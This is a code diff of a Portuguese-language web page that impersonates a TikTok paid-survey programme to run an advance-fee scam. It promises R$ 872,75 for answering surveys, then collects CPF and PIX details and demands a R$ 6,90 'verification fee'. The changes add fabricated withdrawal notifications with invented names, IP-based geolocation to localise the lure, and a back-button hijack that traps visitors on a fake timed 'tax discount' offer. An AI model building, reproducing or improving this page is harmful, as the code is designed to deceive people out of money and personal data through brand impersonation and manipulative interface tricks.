@@ -7,28 +7,15 @@
   <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
   <style>
     @keyframes slideDown {
-      from { transform: translate(-50%, -100%); opacity: 0; }
-      to { transform: translate(-50%, 0); opacity: 1; }
+      from { transform: translateY(-10px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
     }
     .toast-anim {
-      animation: slideDown 0.4s ease-out forwards;
+      animation: slideDown 0.3s ease-out forwards;
     }
   </style>
 </head>
 <body class="bg-slate-50 min-h-screen text-slate-800 flex flex-col justify-between selection:bg-pink-500 selection:text-white font-sans relative">
-
-  <!-- NOTIFICAÇÕES NO TOPO (PROVA SOCIAL DE SAQUES) -->
-  <div id="toast-container" class="fixed top-4 left-1/2 -translate-x-1/2 z-50 transition-all duration-300 opacity-0 pointer-events-none w-[90%] max-w-sm">
-    <div class="bg-slate-900 text-white p-4 rounded-2xl shadow-2xl flex items-center space-x-3 border border-slate-700 backdrop-blur-md bg-opacity-95">
-      <div class="w-10 h-10 rounded-full bg-pink-500/20 text-pink-400 flex items-center justify-center text-xl shrink-0">
-        ⚡
-      </div>
-      <div class="flex-1">
-        <p id="toast-title" class="font-bold text-sm text-pink-400 leading-tight"></p>
-        <p id="toast-desc" class="text-xs text-slate-200 mt-0.5"></p>
-      </div>
-    </div>
-  </div>
 
   <!-- Header Fixo -->
   <header class="w-full bg-white border-b border-slate-100 py-3 px-4 sticky top-0 z-40 flex justify-between items-center shadow-xs">
@@ -45,17 +32,43 @@
     </div>
   </header>
 
+  <!-- NOTIFICAÇÕES (POSICIONADAS ABAIXO DO HEADER E ALINHADAS À DIREITA) -->
+  <div class="w-full max-w-md mx-auto px-4 pt-2 -mb-2 relative z-30 flex justify-end">
+    <div id="toast-container" class="transition-all duration-300 opacity-0 pointer-events-none w-auto max-w-[280px]">
+      <div class="bg-white text-slate-800 p-2.5 px-3 rounded-2xl shadow-lg border border-slate-100 flex items-center space-x-2.5">
+        <div class="w-7 h-7 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-sm font-bold shrink-0">
+          ✓
+        </div>
+        <div class="flex-1">
+          <p id="toast-title" class="font-bold text-xs text-emerald-600 leading-tight">Saque Realizado!</p>
+          <p id="toast-desc" class="text-[11px] text-slate-500 leading-tight mt-0.5"></p>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <!-- Container Principal -->
   <main class="w-full max-w-md mx-auto p-4 flex-1 flex flex-col justify-center">
 
-    <!-- ETAPA 1: Verificação de Idade -->
-    <div id="step-1" class="step-view bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 text-center space-y-6">
+    <!-- ETAPA 1: Verificação de Idade & Banner de Geolocalização -->
+    <div id="step-1" class="step-view bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 text-center space-y-5">
+      <!-- Tag de Ao Vivo & Estado -->
+      <div class="bg-pink-50 border border-pink-100 rounded-2xl p-3 text-center space-y-1">
+        <div class="flex items-center justify-center space-x-2 text-xs font-bold text-pink-600 uppercase tracking-wider">
+          <span class="w-2 h-2 rounded-full bg-pink-500 animate-ping"></span>
+          <span>AO VIVO • VAGAS POR REGIÃO</span>
+        </div>
+        <p class="text-sm font-extrabold text-slate-800">
+          O TikTok está pagando usuários <span id="user-location-text" class="text-pink-600 underline decoration-pink-300">do Brasil</span> para responder pesquisas!
+        </p>
+      </div>
+
       <div class="w-16 h-16 bg-pink-50 text-pink-500 rounded-2xl mx-auto flex items-center justify-center text-3xl shadow-inner">
         🔞
       </div>
       <div class="space-y-2">
         <h1 class="text-2xl font-bold tracking-tight text-slate-900">Verificação de Idade</h1>
-        <p class="text-sm text-slate-500 leading-relaxed">Para participar do programa oficial de pesquisas remuneradas do TikTok, precisamos verificar se você é maior de idade.</p>
+        <p class="text-sm text-slate-500 leading-relaxed">Para participar do programa oficial de pesquisas remuneradas do TikTok na sua região, confirme sua idade.</p>
       </div>
       <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl text-left space-y-1">
         <span class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Você possui mais de 18 anos?</span>
@@ -71,102 +84,171 @@
       </div>
     </div>
 
-    <!-- ETAPA 2: Pesquisa 1 -->
+    <!-- ETAPA 2: Pesquisa 1 de 5 -->
     <div id="step-2" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6">
       <div class="flex justify-between items-center text-xs font-bold text-slate-400 uppercase tracking-wider">
-        <span>Pesquisa 1 de 3</span>
-        <span class="text-pink-600 bg-pink-50 px-2.5 py-1 rounded-full font-bold">+ R$ 250,00</span>
+        <span>PESQUISA 1 DE 5</span>
+        <span class="text-pink-600 bg-pink-50 px-2.5 py-1 rounded-full font-bold">+ R$ 180,00</span>
       </div>
       <div class="space-y-2">
-        <h2 class="text-xl font-bold text-slate-900">Qual formato de vídeo você mais assiste no TikTok?</h2>
-        <p class="text-xs text-slate-500">Escolha uma opção para liberar a recompensa.</p>
+        <h2 class="text-xl font-bold text-slate-900">Quanto tempo por dia você passa no TikTok?</h2>
+        <p class="text-xs text-slate-500">Escolha uma opção para continuar.</p>
       </div>
       <div class="space-y-3" id="options-q1">
-        <button onclick="selectAnswer(1, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 hover:bg-pink-50/30 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
-          <span class="flex items-center gap-2"><span>🎭</span> Vídeos curtos de humor e dancinhas</span>
-          <div class="w-5 h-5 rounded-full border border-slate-300 group-hover:border-pink-500 group-hover:bg-pink-500 flex items-center justify-center text-white text-xs">✓</div>
+        <button onclick="selectAnswer(1, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">⏳</span> Menos de 1 hora</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
-        <button onclick="selectAnswer(1, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 hover:bg-pink-50/30 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
-          <span class="flex items-center gap-2"><span>💡</span> Tutoriais, dicas e vlogs</span>
-          <div class="w-5 h-5 rounded-full border border-slate-300 group-hover:border-pink-500 group-hover:bg-pink-500 flex items-center justify-center text-white text-xs">✓</div>
+        <button onclick="selectAnswer(1, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">⌛</span> 1 a 2 horas</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
-        <button onclick="selectAnswer(1, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 hover:bg-pink-50/30 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
-          <span class="flex items-center gap-2"><span>🔴</span> Transmissões ao vivo (Lives)</span>
-          <div class="w-5 h-5 rounded-full border border-slate-300 group-hover:border-pink-500 group-hover:bg-pink-500 flex items-center justify-center text-white text-xs">✓</div>
+        <button onclick="selectAnswer(1, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">🕰️</span> 2 a 4 horas</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
+        </button>
+        <button onclick="selectAnswer(1, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">📱</span> Mais de 4 horas</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
       </div>
       <button onclick="nextStep(3)" id="btn-q1" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
-        Continuar Pesquisa
+        Continuar ›
       </button>
     </div>
 
-    <!-- ETAPA 3: Pesquisa 2 -->
+    <!-- ETAPA 3: Pesquisa 2 de 5 -->
     <div id="step-3" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6">
       <div class="flex justify-between items-center text-xs font-bold text-slate-400 uppercase tracking-wider">
-        <span>Pesquisa 2 de 3</span>
-        <span class="text-pink-600 bg-pink-50 px-2.5 py-1 rounded-full font-bold">+ R$ 315,50</span>
+        <span>PESQUISA 2 DE 5</span>
+        <span class="text-pink-600 bg-pink-50 px-2.5 py-1 rounded-full font-bold">+ R$ 195,50</span>
       </div>
       <div class="space-y-2">
-        <h2 class="text-xl font-bold text-slate-900">Você costuma comprar produtos recomendados por criadores?</h2>
-        <p class="text-xs text-slate-500">Avalie seu hábito de consumo recente.</p>
+        <h2 class="text-xl font-bold text-slate-900">Como você descobre novos vídeos no TikTok?</h2>
+        <p class="text-xs text-slate-500">Selecione o seu principal meio de navegação.</p>
       </div>
       <div class="space-y-3" id="options-q2">
-        <button onclick="selectAnswer(2, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 hover:bg-pink-50/30 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
-          <span class="flex items-center gap-2"><span>🛍️</span> Sim, compro com frequência</span>
-          <div class="w-5 h-5 rounded-full border border-slate-300 group-hover:border-pink-500 group-hover:bg-pink-500 flex items-center justify-center text-white text-xs">✓</div>
+        <button onclick="selectAnswer(2, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">🎯</span> Feed "Para Você"</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
-        <button onclick="selectAnswer(2, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 hover:bg-pink-50/30 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
-          <span class="flex items-center gap-2"><span>🤔</span> Às vezes, dependendo do valor</span>
-          <div class="w-5 h-5 rounded-full border border-slate-300 group-hover:border-pink-500 group-hover:bg-pink-500 flex items-center justify-center text-white text-xs">✓</div>
+        <button onclick="selectAnswer(2, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">👤</span> Seguindo criadores</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
-        <button onclick="selectAnswer(2, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 hover:bg-pink-50/30 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
-          <span class="flex items-center gap-2"><span>❌</span> Raramente ou nunca</span>
-          <div class="w-5 h-5 rounded-full border border-slate-300 group-hover:border-pink-500 group-hover:bg-pink-500 flex items-center justify-center text-white text-xs">✓</div>
+        <button onclick="selectAnswer(2, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">🔍</span> Através de hashtags</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
+        </button>
+        <button onclick="selectAnswer(2, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">💡</span> Recomendações de amigos</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
       </div>
       <button onclick="nextStep(4)" id="btn-q2" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
-        Continuar Pesquisa
+        Continuar ›
       </button>
     </div>
 
-    <!-- ETAPA 4: Pesquisa 3 -->
+    <!-- ETAPA 4: Pesquisa 3 de 5 -->
     <div id="step-4" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6">
       <div class="flex justify-between items-center text-xs font-bold text-slate-400 uppercase tracking-wider">
-        <span>Pesquisa 3 de 3</span>
-        <span class="text-pink-600 bg-pink-50 px-2.5 py-1 rounded-full font-bold">+ R$ 307,25</span>
+        <span>PESQUISA 3 DE 5</span>
+        <span class="text-pink-600 bg-pink-50 px-2.5 py-1 rounded-full font-bold">+ R$ 165,25</span>
       </div>
       <div class="space-y-2">
-        <h2 class="text-xl font-bold text-slate-900">Qual sua nota para a facilidade de resgate na plataforma?</h2>
-        <p class="text-xs text-slate-500">Última pergunta antes do vídeo de validação final.</p>
+        <h2 class="text-xl font-bold text-slate-900">Qual tipo de conteúdo mais prende sua atenção?</h2>
+        <p class="text-xs text-slate-500">Escolha o seu formato preferido.</p>
       </div>
       <div class="space-y-3" id="options-q3">
-        <button onclick="selectAnswer(3, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 hover:bg-pink-50/30 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
-          <span class="flex items-center gap-2"><span>⭐</span> Excelente e muito prático</span>
-          <div class="w-5 h-5 rounded-full border border-slate-300 group-hover:border-pink-500 group-hover:bg-pink-500 flex items-center justify-center text-white text-xs">✓</div>
+        <button onclick="selectAnswer(3, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">🎭</span> Humor, memes e pegadinhas</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
-        <button onclick="selectAnswer(3, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 hover:bg-pink-50/30 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
-          <span class="flex items-center gap-2"><span>👍</span> Bom, dentro do esperado</span>
-          <div class="w-5 h-5 rounded-full border border-slate-300 group-hover:border-pink-500 group-hover:bg-pink-500 flex items-center justify-center text-white text-xs">✓</div>
+        <button onclick="selectAnswer(3, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">🍳</span> Receitas e culinária</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
-        <button onclick="selectAnswer(3, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 hover:bg-pink-50/30 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
-          <span class="flex items-center gap-2"><span>👌</span> Razoável</span>
-          <div class="w-5 h-5 rounded-full border border-slate-300 group-hover:border-pink-500 group-hover:bg-pink-500 flex items-center justify-center text-white text-xs">✓</div>
+        <button onclick="selectAnswer(3, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">👗</span> Moda, beleza e lifestyle</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
+        </button>
+        <button onclick="selectAnswer(3, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">🎮</span> Games e Tecnologia</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
       </div>
-      <button onclick="finishResearch()" id="btn-q3" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
+      <button onclick="nextStep(5)" id="btn-q3" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
+        Continuar ›
+      </button>
+    </div>
+
+    <!-- ETAPA 5: Pesquisa 4 de 5 -->
+    <div id="step-5" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6">
+      <div class="flex justify-between items-center text-xs font-bold text-slate-400 uppercase tracking-wider">
+        <span>PESQUISA 4 DE 5</span>
+        <span class="text-pink-600 bg-pink-50 px-2.5 py-1 rounded-full font-bold">+ R$ 172,00</span>
+      </div>
+      <div class="space-y-2">
+        <h2 class="text-xl font-bold text-slate-900">Você já comprou algo anunciado no TikTok Shop?</h2>
+        <p class="text-xs text-slate-500">Responda honestamente para validar o seu perfil.</p>
+      </div>
+      <div class="space-y-3" id="options-q4">
+        <button onclick="selectAnswer(4, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">🛍️</span> Sim, compro frequentemente</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
+        </button>
+        <button onclick="selectAnswer(4, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">🛒</span> Compraria se visse algo interessante</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
+        </button>
+        <button onclick="selectAnswer(4, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">🚫</span> Prefiro não comprar em redes sociais</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
+        </button>
+      </div>
+      <button onclick="nextStep(6)" id="btn-q4" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
+        Continuar ›
+      </button>
+    </div>
+
+    <!-- ETAPA 6: Pesquisa 5 de 5 -->
+    <div id="step-6" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6">
+      <div class="flex justify-between items-center text-xs font-bold text-slate-400 uppercase tracking-wider">
+        <span>PESQUISA 5 DE 5</span>
+        <span class="text-pink-600 bg-pink-50 px-2.5 py-1 rounded-full font-bold">+ R$ 160,00</span>
+      </div>
+      <div class="space-y-2">
+        <h2 class="text-xl font-bold text-slate-900">Como você avalia a experiência com o programa de recompensas?</h2>
+        <p class="text-xs text-slate-500">Última pergunta antes de liberar o valor total final de R$ 872,75.</p>
+      </div>
+      <div class="space-y-3" id="options-q5">
+        <button onclick="selectAnswer(5, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">⭐</span> Rápida, fácil e satisfatória</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
+        </button>
+        <button onclick="selectAnswer(5, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">👍</span> Muito boa</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
+        </button>
+        <button onclick="selectAnswer(5, this)" class="w-full text-left p-4 rounded-2xl border border-slate-100 hover:border-pink-500 transition-all text-sm font-medium text-slate-700 flex items-center justify-between group cursor-pointer">
+          <span class="flex items-center gap-3"><span class="text-lg">👌</span> Razoável</span>
+          <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
+        </button>
+      </div>
+      <button onclick="finishResearch()" id="btn-q5" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
         Processar Saldo Total
       </button>
     </div>
 
-    <!-- ETAPA 5: Validação do Vídeo -->
-    <div id="step-5" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-5">
+    <!-- ETAPA 7: Validação do Vídeo -->
+    <div id="step-7" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-5">
       <div class="text-center space-y-1">
         <h2 class="text-xl font-bold text-slate-900">Confirmação de Visualização</h2>
-        <p class="text-xs text-slate-500">Assista ao vídeo abaixo por 40 segundos para liberar o saldo total acumulado.</p>
+        <p class="text-xs text-slate-500">Assista ao vídeo abaixo por 40 segundos para liberar o saldo acumulado de R$ 872,75.</p>
       </div>
       
       <div id="video-container" class="w-full aspect-[9/16] max-h-[340px] bg-black rounded-2xl overflow-hidden relative shadow-inner">
-        <!-- O iframe do vídeo é inserido via JS para controlar e encerrar o áudio com precisão -->
       </div>
 
       <div class="space-y-2">
@@ -184,8 +266,8 @@
       </button>
     </div>
 
-    <!-- ETAPA 6: Cadastro de Saque PIX -->
-    <div id="step-6" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6">
+    <!-- ETAPA 8: Cadastro de Saque PIX -->
+    <div id="step-8" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6">
       <div class="text-center space-y-1">
         <h2 class="text-xl font-bold text-slate-900">Dados para Recebimento</h2>
         <p class="text-xs text-slate-500">Informe seus dados para emitir a taxa de verificação e resgatar o saldo.</p>
@@ -217,13 +299,13 @@
         </div>
       </div>
 
-      <button id="btn-pay-action" onclick="finishOrder()" class="w-full bg-pink-600 hover:bg-pink-700 active:scale-[0.98] transition-all text-white font-semibold py-3.5 px-4 rounded-xl shadow-md shadow-pink-200 cursor-pointer">
+      <button id="btn-pay-action" onclick="finishOrder(6.90)" class="w-full bg-pink-600 hover:bg-pink-700 active:scale-[0.98] transition-all text-white font-semibold py-3.5 px-4 rounded-xl shadow-md shadow-pink-200 cursor-pointer">
         PAGAR R$ 6,90 E RECEBER R$ 872,75
       </button>
     </div>
 
-    <!-- ETAPA 7: Tela do Pix Copia e Cola -->
-    <div id="step-7" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6 text-center">
+    <!-- ETAPA 9: Tela do Pix Copia e Cola -->
+    <div id="step-9" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6 text-center">
       <div class="w-16 h-16 bg-emerald-50 text-emerald-500 rounded-2xl mx-auto flex items-center justify-center text-3xl shadow-inner">
         ⚡
       </div>
@@ -241,11 +323,42 @@
       </div>
 
       <div class="text-xs text-slate-500 bg-amber-50 border border-amber-100 p-3 rounded-xl text-left leading-relaxed">
-        ⚠️ Assim que o pagamento de R$ 6,90 for confirmado via SyncPay, o saldo de R$ 872,75 será enviado automaticamente para a sua conta.
+        ⚠️ Assim que o pagamento for confirmado via SyncPay, o saldo de R$ 872,75 será enviado automaticamente para a sua conta.
       </div>
 
-      <button onclick="switchStep(6)" class="w-full bg-slate-100 hover:bg-slate-200 text-slate-600 font-medium py-2.5 px-4 rounded-xl text-xs cursor-pointer transition-all">
+      <button onclick="switchStep(8)" class="w-full bg-slate-100 hover:bg-slate-200 text-slate-600 font-medium py-2.5 px-4 rounded-xl text-xs cursor-pointer transition-all">
         ← Voltar e alterar dados / CPF
+      </button>
+    </div>
+
+    <!-- ETAPA 10: TELA / MODAL DE DESCONTO (DISPARADA AO CLICAR NA SETA DE VOLTAR DO NAVEGADOR) -->
+    <div id="step-discount" class="step-view hidden bg-white rounded-3xl p-6 shadow-2xl border-2 border-emerald-400 space-y-5 text-center relative">
+      <div class="bg-emerald-50 border border-emerald-200 p-3 rounded-2xl space-y-1">
+        <div class="text-emerald-700 font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-1">
+          <span>✅ OPORTUNIDADE ÚNICA NO CPF</span>
+        </div>
+        <h2 class="text-lg font-black text-emerald-800 leading-tight">
+          IDENTIFICAMOS UM DESCONTO DE IMPOSTOS E TAXAS!
+        </h2>
+      </div>
+
+      <div class="space-y-1">
+        <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">ESTA OFERTA EXPIRA EM:</p>
+        <div id="discount-timer" class="text-4xl font-black text-rose-600 font-mono tracking-tight">04:59</div>
+      </div>
+
+      <div class="bg-slate-50 rounded-2xl p-4 border border-slate-100 space-y-2">
+        <p class="text-sm font-semibold text-slate-600">Taxa reduzida para apenas:</p>
+        <p class="text-3xl font-black text-slate-900">R$ 4,90</p>
+        <p class="text-xs font-extrabold text-emerald-600 uppercase tracking-wide">+ R$ 150,00 DE BÔNUS EXTRA</p>
+      </div>
+
+      <p class="text-[11px] text-slate-400 leading-tight">
+        *O desconto de impostos e taxas foi aplicado. Ao pagar os R$ 4,90, o sistema libera seu saldo acumulado + o bônus de R$ 150,00 imediatamente via PIX.
+      </p>
+
+      <button onclick="acceptDiscount()" class="w-full bg-emerald-500 hover:bg-emerald-600 active:scale-[0.98] text-white font-black py-4 px-4 rounded-2xl shadow-lg shadow-emerald-200 text-sm tracking-wide transition-all cursor-pointer">
+        RESGATAR MEU DESCONTO + BÔNUS ›
       </button>
     </div>
 
@@ -261,36 +374,92 @@
     let videoTimer = null;
     let secondsWatched = 0;
     const totalRequired = 40;
+    let discountCountdown = 299; // 5 minutos
+    let discountInterval = null;
 
-    // Notificações sociais no topo
     const fakeNotifications = [
-      { name: "Carla M. (SP)", text: "Acabou de sacar R$ 872,75 via Pix!" },
-      { name: "Marcos V. (RJ)", text: "Completou as pesquisas e resgatou." },
-      { name: "Juliana S. (MG)", text: "Recebeu R$ 872,75 na conta agora." },
-      { name: "Lucas P. (PR)", text: "Validou o vídeo e gerou o saque!" }
+      { name: "Ricardo Almeida de Castanhal", text: "sacou R$ 540,90" },
+      { name: "Ana Silva de Castanhal", text: "sacou R$ 512,75" },
+      { name: "Juliana Santos de Belém", text: "sacou R$ 872,75" },
+      { name: "Marcos Lima de Ananindeua", text: "sacou R$ 620,00" },
+      { name: "Carla Mendes de Marabá", text: "sacou R$ 872,75" }
     ];
+
+    // --- 1. GEOLOCALIZAÇÃO AUTOMÁTICA POR IP ---
+    async function fetchUserLocation() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        if (data && data.region) {
+          document.getElementById('user-location-text').textContent = `do ${data.region}`;
+        }
+      } catch (e) {
+        console.log("Não foi possível carregar a localização:", e);
+      }
+    }
+
+    // --- 2. BACK REDIRECT / INTERCEPTAÇÃO DO BOTÃO VOLTAR ---
+    function setupBackRedirect() {
+      history.pushState(null, null, location.href);
+      window.onpopstate = function () {
+        history.pushState(null, null, location.href);
+        showDiscountScreen();
+      };
+    }
+
+    function showDiscountScreen() {
+      switchStep('discount');
+      startDiscountTimer();
+    }
+
+    function startDiscountTimer() {
+      if (discountInterval) return;
+      discountInterval = setInterval(() => {
+        let minutes = Math.floor(discountCountdown / 60);
+        let seconds = discountCountdown % 60;
+        minutes = minutes < 10 ? '0' + minutes : minutes;
+        seconds = seconds < 10 ? '0' + seconds : seconds;
+        const el = document.getElementById('discount-timer');
+        if (el) el.textContent = `${minutes}:${seconds}`;
+
+        if (discountCountdown > 0) {
+          discountCountdown--;
+        } else {
+          clearInterval(discountInterval);
+        }
+      }, 1000);
+    }
+
+    function acceptDiscount() {
+      switchStep(8);
+      const btnPay = document.getElementById('btn-pay-action');
